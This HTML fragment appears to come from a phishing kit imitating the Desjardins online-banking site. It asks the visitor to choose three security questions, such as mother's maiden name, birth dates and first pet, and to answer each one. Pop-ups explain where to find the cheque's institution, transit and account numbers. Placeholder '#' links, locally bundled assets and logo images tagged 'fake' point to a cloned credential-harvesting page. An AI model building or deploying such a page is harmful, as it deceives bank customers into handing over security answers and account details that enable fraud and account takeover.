              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?">Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?">Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?">Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?</option>
              <option value="Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?">Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?">Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma m&egrave;re?">Quel est le nom de jeune fille de ma m&egrave;re?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?">Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?">Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?">Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?">Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?</option>
              <option value="Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?">Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?</option>
              <option value="Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?">Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?</option>
              <option value="Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?">Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?">Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?">Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon p&egrave;re?">Quelle est la couleur naturelle des cheveux de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?</option>
            </select>  <br><br><b>&nbsp;R&eacute;ponse 2 :</b>
            <input required="true" id="a2" name="a2"  type="text" value="" autocomplete="off"/></b> 
<br><br>
              
	<b> <div align="left">Question 3 :
					<select required="true" name="q3" id="q3">
              <option value="">Selection</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait ma m&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole secondaire?</option>
              <option value="En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?">En quelle ann&eacute;e (aaaa) ai-je d&eacute;m&eacute;nag&eacute; de chez mes parents pour m'installer dans mon premier appartement?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?">Quelle est la ville/municipalit&eacute; de mon premier appartement/logement?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?">Quelle est la couleur naturelle des cheveux de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?">Quel est le deuxi&egrave;me pr&eacute;nom (autre que son pr&eacute;nom usuel) figurant sur l'acte de naissance de ma premi&egrave;re fille?</option>
              <option value="Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quelle est la ville o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?">Quel est le pr&eacute;nom de ma grand-m&egrave;re maternelle?</option>
              <option value="Quelle est la date (jj-mmm) de mon premier mariage?">Quelle est la date (jj-mmm) de mon premier mariage?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mmm) de naissance de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?">Quel est le pr&eacute;nom de mon deuxi&egrave;me enfant?</option>
              <option value="Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?">Quel est le pays o&ugrave; j'ai atterri la premi&egrave;re fois que j'ai pris l'avion?</option>
              <option value="Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mmm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma premi&egrave;re ann&eacute;e du secondaire?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon p&egrave;re lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de mon premier animal de compagnie?">Quel est le nom de mon premier animal de compagnie?</option>
              <option value="Quel est le nom de jeune fille de ma m&egrave;re?">Quel est le nom de jeune fille de ma m&egrave;re?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 18 ans?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; je suis n&eacute;?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?">Quels sont le jour et le mois (jj-mm) de naissance de mon fils le plus &acirc;g&eacute;?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quelle est l'ann&eacute;e (aaaa) de naissance de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?">Quel est le nom de l'&eacute;cole que je fr&eacute;quentais &agrave; ma quatri&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?">Quelle est la couleur naturelle des cheveux de mon fr&egrave;re le plus &acirc;g&eacute;?</option>
              <option value="Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?">Quelle est la ville/municipalit&eacute; o&ugrave; est situ&eacute;e la premi&egrave;re maison dont j'ai &eacute;t&eacute; propri&eacute;taire?</option>
              <option value="Quelle est la couleur naturelle de mes cheveux?">Quelle est la couleur naturelle de mes cheveux?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma maternelle?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon baccalaur&eacute;at?</option>
              <option value="Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?">Quel est le num&eacute;ro de la rue o&ugrave; j'habitais &agrave; 25 ans?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?">Quel est le nom de la rue de l'&eacute;cole primaire o&ugrave; j'ai compl&eacute;t&eacute; ma sixi&egrave;me ann&eacute;e?</option>
              <option value="Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?">Quel est le nom de l'h&ocirc;pital/de la maison de naissance o&ugrave; je suis n&eacute;?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 30 ans?</option>
              <option value="Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?">Quel est le nom de jeune fille de ma grand-m&egrave;re paternelle?</option>
              <option value="Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?">Quel est le nom du premier employeur o&ugrave; j'ai re&ccedil;u mon premier salaire r&eacute;gulier?</option>
              <option value="Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?">Quelle &eacute;tait la ville/municipalit&eacute; o&ugrave; habitait mon premier amour s&eacute;rieux?</option>
              <option value="Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?">Au total, combien de fr&egrave;res et soeurs a/avait mon p&egrave;re?</option>
              <option value="Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la rue de l'&eacute;cole que je fr&eacute;quentais &agrave; ma cinqui&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?">Quelle est l'ann&eacute;e (aaaa) de naissance de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de mon p&egrave;re?</option>
              <option value="Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?">Quel est le nom de famille de mon premier &eacute;poux/ma premi&egrave;re &eacute;pouse?</option>
              <option value="Quelle est la couleur naturelle des cheveux de ma m&egrave;re?">Quelle est la couleur naturelle des cheveux de ma m&egrave;re?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?">Quels sont le jour et le mois (jj-mm) de naissance de ma fille la plus &acirc;g&eacute;e?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?">Quel est le nom de la ville/municipalit&eacute; de l'universit&eacute; o&ugrave; j'ai obtenu mon premier certificat?</option>
              <option value="Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?">Quel est le nom de l'&eacute;cole o&ugrave; mon premier fils a commenc&eacute; ses &eacute;tudes primaires?</option>
              <option value="Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?">Quel m&eacute;tier exer&ccedil;ait mon grand-p&egrave;re maternel lorsque j'allais &agrave; l'&eacute;cole primaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?">Quel est le nom de la ville/municipalit&eacute; du c&eacute;gep/coll&egrave;ge o&ugrave; j'ai commenc&eacute; mes &eacute;tudes coll&eacute;giales?</option>
              <option value="Quelle est la couleur naturelle des cheveux de mon p&egrave;re?">Quelle est la couleur naturelle des cheveux de mon p&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; j'habitais &agrave; 5 ans?</option>
              <option value="Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?">Quels sont le jour et le mois (jj-mm) de naissance de ma m&egrave;re?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?">Quel est le nom de la ville/municipalit&eacute; de l'&eacute;cole que je fr&eacute;quentais &agrave; ma troisi&egrave;me ann&eacute;e du secondaire?</option>
              <option value="Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?">Quel est le nom de la ville/municipalit&eacute; o&ugrave; est n&eacute; mon p&egrave;re?</option>
            </select>  <br><br><b>&nbsp;R&eacute;ponse 3 :</b>
            <input required="true" id="a3" name="a3"  type="text" value="" autocomplete="off"/></b> </label></div>
<br>
                </div>
                <div class="row top20px">
                    <div class="col-xs-12 col-sm-9 col-md-9 text-right">
                        </div></div>
                    </div>
                    <div align="center" class="col-xs-12 col-sm-15 col-md-15">
                   <br>    <button  id="btnSoumettre" type="submit" class="btn btn-primary fullwidth">Continuer</button> </div> </div> </div> </div> <input type="hidden" name="_tk" value="40a4f3b3-bd21-4223-ac27-f785ec5a2cf0" />
</form>

    <div class="col-sm-24 text-right top15px non-selectable hidden-xs">
        <img alt="S&eacute;curit&eacute; garantie &agrave; 100 %" src="files/g00-logo-securite-garantie-f.png" />
    </div>

    
<div class="modal fade" id="modale-institution" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="" src="files//contenu-cheque-815-institut.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-transit" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 5 chiffres." src="files//contenu-cheque-815-transit.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>
<div class="modal fade" id="modale-compte" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog margin-top">
        <div class="modal-content padding-left10px padding-right10px">
            <div class="modal-header"></div>
            <p>
                <img class="fullwidth" alt="Il se compose de 7 chiffres." src="files//contenu-cheque-815-folio.png"/>
            </p>
            <div class="modal-footer padding-left0px padding-right0px">
                <div class="row">
                    <div class="col-xs-offset-6 col-xs-12 text-right">
                        <a data-dismiss='modal' class='btn btn-primary fullwidth' href='#'>
                            Fermer
 </a> </div> </div> </div> </div> </div>
</div>





                     
                                <div id="securiteMobile" class="hidden-sm hidden-md hidden-lg">
                                    <img class="fake" src="files/g00-logo-securite-garantie-f.png" />
                                    <img class="fake" src="files/a00-entete-logo-desjardins.png" />
                                    <div id="img_wrap" class="row col-xs-24 padding-left10px">
                                        <img class="normal non-selectable" title="" src="files/g00-logo-securite-garantie-f.png" alt=""/>
                                        <img class="normal non-selectable padding-left20px" title="Desjardins" src="files/a00-entete-logo-desjardins.png" alt="Desjardins"/>
                                    </div>
                                </div>
                                <br/>
                            

                            <br/>
                        </div>
                    </div>

                </div>

            <br/>

            </div>
        </div>
    </div>

    <footer class="footer">

        
                <span class="hidden-xs">
                    


  
  

    <div id="zone-pied-de-page">
      <div id="pied">
      
        <div id="plan-site">
          <h2 class="hors-ecran">Plan du site</h2>
          <div id="tetes-sections">
            <ul>
          
            
            
          
              <li><a href="#">Services aux particuliers</a></li>
              <li><a href="#">Services aux entreprises</a></li>
              <li><a href="#">Coopmoi</a></li>
              <li><a href="#">&Agrave; propos</a></li>
              <li><a href="#">Desjardins sur mobile, GPS et RSS</a></li>
            </ul>
          </div>
        </div>
        <div id="zone-legale">
          



<ul>
  <li><a href="#">S&eacute;curit&eacute;</a></li>
  <li><a href="#">Confidentialit&eacute;</a></li>
  <li><a href="#">Conditions d'utilisation et notes l&eacute;gales</a></li>
  <li><a href="#">Accessibilit&eacute;</a></li>
  <li><a href="#">Plan du site</a></li>
</ul>





<p class="copyright">&copy; 1996-2019, 

  
  Mouvement des caisses Desjardins.
 Tous droits r&eacute;serv&eacute;s.</p>


        </div>
      </div>
    </div>

  


  
 </span> 
                <span class="hidden-sm hidden-md hidden-lg">
                    
<div id="pied-de-page" class="container texte-blanc">
    <div class="row">
        <div class="col-sm-4 col-md-4 text-left pied-de-page-logo hidden-xs">
            
        </div>
        <div class="col-xs-24 col-sm-16 col-md-16 text-center pied-de-page-texte">
                <span class="hidden-xs">
                    
                            <a href="javascript:popup('#','S&eacute;curit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">S&eacute;curit&eacute;</a> | 
                            <a href="javascript:popup('#','Confidentialit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Confidentialit&eacute;</a> | 
                            <a href="javascript:popup('#','Conditions utilisation','scrollbars=yes,resizable=yes,width=500,height=500');">Conditions d&#39;utilisation et notes l&eacute;gales</a> | 
                            <a href="javascript:popup('#','Accessibilit&eacute;','scrollbars=yes,resizable=yes,width=500,height=500');">Accessibilit&eacute;</a> 
 <br /> 
 </span> <p>Copyright &copy; 2019 Mouvement des caisses Desjardins. Tous droits r&eacute;serv&eacute;s.</p>

        </div>
        <div class="col-xs-4 col-sm-4 col-md-4 text-right hidden-xs hidden-sm">
            
 </div> </div>
</div>

 </span> 
 </footer> 
        <!-- MONITEUR D'ACTIVITES -->
        
 <!-- Inclusion des fichiers javascripts pour le comportement --> 
<script src="files/bootstrap.min.js" type="text/javascript"></script>
<!--[if lt IE 9]>
    <script src="files/respond.min.js"></script>
<![endif]-->


<script src="files/fwd-bootstrap.min.js" type="text/javascript"></script>
<!--[if IE]>
    <script src="files/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if lt IE 9]>
    
    <script src="files/html5shiv.js" type="text/javascript"></script>
    
    <script src="files/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->

<!--[if IE 9]>
    
    <script src="files/jquery.placeholder.min.js" type="text/javascript"></script>
<![endif]-->







</body>
</html>
